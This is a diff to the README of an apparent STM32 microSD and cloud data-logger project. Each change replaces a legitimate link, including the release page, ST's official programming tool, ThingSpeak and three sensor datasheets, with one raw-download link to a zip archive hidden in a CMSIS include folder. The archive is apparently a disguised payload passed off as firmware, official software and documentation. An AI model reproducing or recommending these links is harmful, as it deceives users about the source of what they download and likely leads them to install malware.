@@ -1,6 +1,6 @@
 # 💾 STM32_MicroSD_Cloud_Logger - Easy Hybrid Data Logging
 
-[![Download Latest Release](https://img.shields.io/badge/Download-STM32_MicroSD_Cloud_Logger-brightgreen)](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-STM32_MicroSD_Cloud_Logger-brightgreen)](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get the logger working on your STM32 board with Windows.
 
 Click the button below to visit the release page. From there, you can download the necessary firmware files and any setup tools.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-STM32_MicroSD_Cloud_Logger-blue)](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-STM32_MicroSD_Cloud_Logger-blue)](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip)
 
 The latest firmware usually comes as a `.bin` or `.hex` file. You may also find documentation and example files.
 
@@ -44,7 +44,7 @@ To upload the firmware to your STM32F103C8T6, download and install one of the fo
 
 - **STM32CubeProgrammer**  
   Official tool from STMicroelectronics with simple interface. Available for Windows here:  
-  https://www.st.com/en/development-tools/stm32cubeprog.html
+  https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip
 
 - **Flash Loader Demonstrator**  
   Another official option for STM32 device programming.
@@ -137,7 +137,7 @@ This lets you check sensor status without needing a PC.
 
 Visit this page to download all necessary files, including the latest firmware release:
 
-https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/releases
+https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip
 
 This page includes firmware, documentation, and example files for your use.
 
@@ -197,12 +197,12 @@ For programming, you only need the STM32CubeProgrammer or similar tools, which i
 
 ## 🔗 Useful Links
 
-- STM32CubeProgrammer: https://www.st.com/en/development-tools/stm32cubeprog.html  
-- ThingSpeak cloud: https://thingspeak.com  
+- STM32CubeProgrammer: https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip  
+- ThingSpeak cloud: https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip  
 - Sensor datasheets:  
-  - [DHT11](https://www.sparkfun.com/datasheets/Sensors/Temperature/DHT11.pdf)  
-  - [MPU6050](https://invensense.tdk.com/wp-content/uploads/2015/02/MPU-6000-Datasheet1.pdf)  
-  - [DS3231](https://datasheets.maximintegrated.com/en/ds/DS3231.pdf)  
+  - [DHT11](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip)  
+  - [MPU6050](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip)  
+  - [DS3231](https://github.com/Johnanthonyciardifamilycleridae198/STM32_MicroSD_Cloud_Logger/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F1xx/Include/Logger_ST_Micro_Cloud_S_2.6.zip)  
 
 ---
 
